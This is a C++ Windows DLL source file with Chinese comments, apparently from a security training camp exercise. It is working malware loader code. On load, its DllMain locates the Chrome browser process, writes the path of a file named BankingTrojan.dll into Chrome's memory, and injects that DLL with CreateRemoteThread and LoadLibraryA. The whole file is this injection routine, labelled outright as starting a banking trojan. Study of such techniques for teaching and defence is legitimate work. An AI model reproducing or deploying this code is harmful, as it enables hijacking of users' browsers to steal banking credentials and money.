#include <windows.h>            // 引入 Windows API 函式庫
#include "pch.h"                // 預編譯頭檔案 (如果有的話)
#include <cstdio>               // 引入標準輸入輸出函式庫
#include <tlhelp32.h>           // 引入 Windows 用來獲取系統快照的函式庫
#include <iostream>             // 引入 C++ 標準輸入輸出函式庫

using namespace std;

// 定義一個函式，用來根據程式名稱取得對應的進程 ID
DWORD GetProcessIDByName(const std::wstring& processName) {
    PROCESSENTRY32 pe32;  // 用來儲存進程資訊的結構體
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  // 取得所有進程的快照

    if (hProcessSnap == INVALID_HANDLE_VALUE) {  // 如果取得快照失敗
        std::cerr << "Failed to take snapshot of processes" << std::endl;
        return 0;  // 返回 0 表示錯誤
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);  // 設定結構體大小

    // 如果能夠成功讀取進程快照
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {  // 比對進程的名稱
                CloseHandle(hProcessSnap);  // 關閉進程快照句柄
                return pe32.th32ProcessID;  // 返回找到的進程 ID
            }
        } while (Process32Next(hProcessSnap, &pe32));  // 繼續遍歷下一個進程
    }

    CloseHandle(hProcessSnap);  // 如果未找到，則關閉快照句柄
    return 0;  // 返回 0 表示未找到進程
}

// 定義一個函式，用來啟動銀行木馬 (Banking Trojan)
extern "C" __declspec(dllexport) void StartBankingTrojan() {
    // 木馬的 DLL 檔案路徑
    char dllname[150] = "C:/Users/zhang/Downloads/class3/malware/T5Camp_2025_Trojan/Chrome/BankingTrojan.dll";
    std::wstring processName = L"chrome.exe";  // 目標進程名稱 (此例為 Chrome)
    DWORD pid = GetProcessIDByName(processName);  // 根據進程名稱取得進程 ID
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);  // 開啟該進程，獲取訪問權限

    int size = strlen(dllname) + 1;  // 計算 DLL 路徑的長度
    PVOID procdlladdr = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);  // 在目標進程中分配記憶體
    if (procdlladdr == NULL) {  // 如果記憶體分配失敗
        printf("handle %p VirtualAllocEx failed\n", hprocess);
    }

    SIZE_T writenum;  
    // 把 DLL 路徑寫入目標進程的記憶體中
    if (!WriteProcessMemory(hprocess, procdlladdr, dllname, size, &writenum)) {
        printf("handle %p WriteProcessMemory failed\n", hprocess);  // 如果寫入失敗
    }

    // 取得 LoadLibraryA 函式的地址 (這是用來加載 DLL 的 Windows 函式)
    FARPROC loadfuncaddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (!loadfuncaddr) {  // 如果獲取地址失敗
        DWORD err = GetLastError();
        printf("GetProcAddress failed. Error code: %lu\n", err);
    }

    // 在目標進程中創建一個新的執行緒，執行 LoadLibraryA 函式，並加載上述的 DLL
    HANDLE hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadfuncaddr, (LPVOID)procdlladdr, 0, NULL);
    if (!hthread) {  // 如果創建執行緒失敗
        DWORD err = GetLastError();
        printf("CreateRemoteThread failed. Error code: %lu\n", err);
    }

    CloseHandle(hthread);  // 關閉執行緒句柄
    CloseHandle(hprocess);  // 關閉進程句柄
}

// DLL 主函式，當 DLL 被加載時會執行此函式
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {  // 根據不同的調用原因執行相應的操作
    case DLL_PROCESS_ATTACH:  // 如果是 DLL 被加載時
        StartBankingTrojan();  // 啟動木馬
        break;
    case DLL_THREAD_ATTACH:  // 如果是新執行緒被創建時
    case DLL_THREAD_DETACH:  // 如果是執行緒被終止時
    case DLL_PROCESS_DETACH:  // 如果是 DLL 被卸載時
        break;
    }
    return TRUE;  // 成功加載 DLL
}
